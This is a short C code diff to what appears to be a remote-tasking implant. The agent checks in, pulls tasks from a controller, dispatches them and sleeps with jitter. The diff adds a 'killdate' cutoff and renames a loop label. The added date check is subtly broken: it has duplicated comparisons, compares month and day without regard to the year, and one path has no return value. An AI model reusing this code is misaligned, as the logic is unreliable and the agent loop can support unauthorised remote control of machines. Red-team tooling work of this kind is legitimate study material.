@@ -497,19 +497,38 @@ free(unformatted_buff);
 return;
 }
 
-int main(){
+bool killdate_check(){
+    if(!strcmp(config.killdate,"REPLACE_ME_KILLDATE") || !strlen(config.killdate)){
+        return 0;
+    }
+    int year = 0, month = 0, day = 0;
+    if (sscanf(config.killdate, "%d-%d-%d", &year, &month, &day) != 3) {
+        return false; 
+    }
 
+    SYSTEMTIME s;
+    GetLocalTime(&s);
+    if (s.wYear  > year)  return 1;
+    if (s.wYear  > year)  return 1;
+    if (s.wMonth > month) return 1;
+    if (s.wMonth > month) return 1;
+    if (s.wDay   >= day)  return 1;
+}
+
+int main(){
+    if(killdate_check()){return 0;}
     init_queue(&q);
     checkin();
 //main loop
-abc:
+main_loop:
         if (!isEmpty(&q)){
         dispatcher(dequeue(&q));
     }
         get_tasks();
+
         sleep_with_jitter(config.interval,config.jitter); //jitter also activates between every task completion - idk if i like it, but let's skip that for a moment
 
-goto abc;
+goto main_loop;
 
 	return 0;
 }
